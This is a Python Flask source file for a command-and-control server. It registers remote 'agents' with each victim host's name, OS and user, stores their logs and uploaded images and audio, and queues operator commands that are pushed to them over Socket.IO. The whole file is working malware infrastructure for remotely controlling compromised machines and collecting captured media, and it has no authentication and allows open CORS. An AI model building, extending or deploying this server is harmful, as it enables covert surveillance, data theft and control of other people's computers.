from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
import sqlite3
import json
import os
import base64
import io
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'change-this-in-production'
socketio = SocketIO(app, cors_allowed_origins="*")

DB_PATH = 'c2.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS agents (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        os TEXT,
        user TEXT,
        arch TEXT,
        last_seen TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        type TEXT,
        data TEXT,
        timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS media (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        type TEXT,
        data BLOB,
        timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        command TEXT,
        issued TEXT,
        executed TEXT,
        result TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def dashboard():
    return render_template('index.html')

# API endpoints
@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    agent_id = data.get('id')
    info = data.get('info', {})
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('REPLACE INTO agents (id, hostname, os, user, arch, last_seen) VALUES (?,?,?,?,?,?)',
              (agent_id, info.get('hostname'), info.get('os'), info.get('user'), info.get('arch'), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    socketio.emit('agent_online', {'id': agent_id, 'info': info})
    return jsonify({'status': 'registered'})

@app.route('/api/log', methods=['POST'])
def log():
    data = request.json
    agent_id = data.get('agent_id')
    log_type = data.get('type')
    log_data = data.get('data')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT INTO logs (agent_id, type, data, timestamp) VALUES (?,?,?,?)',
              (agent_id, log_type, log_data, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    socketio.emit('new_log', {'agent_id': agent_id, 'type': log_type, 'data': log_data})
    return jsonify({'status': 'logged'})

@app.route('/api/media', methods=['POST'])
def media():
    data = request.json
    agent_id = data.get('agent_id')
    media_type = data.get('type')
    b64_data = data.get('data')
    blob = base64.b64decode(b64_data)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT INTO media (agent_id, type, data, timestamp) VALUES (?,?,?,?)',
              (agent_id, media_type, blob, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'media saved'})

@app.route('/api/command', methods=['POST'])
def command():
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT INTO commands (agent_id, command, issued, executed, result) VALUES (?,?,?,?,?)',
              (agent_id, command, datetime.now().isoformat(), '', ''))
    conn.commit()
    conn.close()
    socketio.emit('new_command', {'agent_id': agent_id, 'command': command})
    return jsonify({'status': 'command queued'})

@app.route('/api/agents', methods=['GET'])
def get_agents():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    rows = c.execute('SELECT * FROM agents').fetchall()
    conn.close()
    agents = [{'id': r[0], 'hostname': r[1], 'os': r[2], 'user': r[3], 'arch': r[4], 'last_seen': r[5]} for r in rows]
    return jsonify(agents)

@app.route('/api/logs/<agent_id>', methods=['GET'])
def get_logs(agent_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    rows = c.execute('SELECT type, data, timestamp FROM logs WHERE agent_id=? ORDER BY timestamp DESC LIMIT 200', (agent_id,)).fetchall()
    conn.close()
    logs = [{'type': r[0], 'data': r[1], 'timestamp': r[2]} for r in rows]
    return jsonify(logs)

@app.route('/api/media/<int:media_id>')
def get_media(media_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    row = c.execute('SELECT type, data FROM media WHERE id=?', (media_id,)).fetchone()
    conn.close()
    if row:
        mimetype = 'image/jpeg' if row[0]=='image' else 'audio/wav'
        return send_file(io.BytesIO(row[1]), mimetype=mimetype)
    return 'Not found', 404

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)